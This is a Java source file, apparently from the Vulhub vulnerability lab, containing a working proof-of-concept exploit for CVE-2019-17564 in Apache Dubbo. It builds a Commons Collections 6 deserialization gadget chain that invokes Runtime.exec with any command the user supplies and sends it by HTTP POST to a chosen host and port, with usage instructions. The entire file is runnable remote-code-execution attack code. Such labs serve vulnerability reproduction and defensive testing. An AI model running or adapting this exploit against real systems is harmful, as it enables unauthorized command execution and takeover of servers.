package org.vulhub.poc;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.OutputStream;
import java.lang.reflect.Field;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.HashMap;
import java.util.Map;

public class CVE201917564 {
    public static void main(String[] args) throws Exception {
        String[] positional = PocUtils.positional(args);
        if (positional.length < 2 || positional.length > 4) {
            System.err.println("Usage: CVE-2019-17564 <host> <port> [service] [command]");
            System.err.println("Example: CVE-2019-17564 127.0.0.1 8080 org.vulhub.api.CalcService \"touch /tmp/success\"");
            System.exit(1);
        }

        String host = positional[0];
        int port = Integer.parseInt(positional[1]);
        String service = positional.length >= 3 ? positional[2] : "org.vulhub.api.CalcService";
        String command = positional.length == 4 ? positional[3] : "touch /tmp/success";
        byte[] payload = PocUtils.serialize(makeCommonsCollections6(command));

        URL url = new URL("http://" + host + ":" + port + "/" + service);
        HttpURLConnection connection = (HttpURLConnection) url.openConnection();
        connection.setRequestMethod("POST");
        connection.setDoOutput(true);
        connection.setRequestProperty("Content-Type", "application/octet-stream");
        connection.setFixedLengthStreamingMode(payload.length);
        try (OutputStream output = connection.getOutputStream()) {
            output.write(payload);
        }
        System.out.println("HTTP payload sent to " + url + ", response code: " + connection.getResponseCode());
        connection.disconnect();
    }

    private static Object makeCommonsCollections6(String command) throws Exception {
        ChainedTransformer transformerChain = new ChainedTransformer(new Transformer[]{new ConstantTransformer(1)});
        Map<Object, Object> innerMap = new HashMap<>();
        Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
        TiedMapEntry entry = new TiedMapEntry(lazyMap, "vulhub");
        Map<Object, Object> payload = new HashMap<>();
        payload.put(entry, "vulhub");
        lazyMap.remove("vulhub");

        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class},
                        new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class},
                        new Object[]{null, new Object[0]}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{command}),
                new ConstantTransformer(1)
        };

        Field field = ChainedTransformer.class.getDeclaredField("iTransformers");
        field.setAccessible(true);
        field.set(transformerChain, transformers);
        return payload;
    }
}
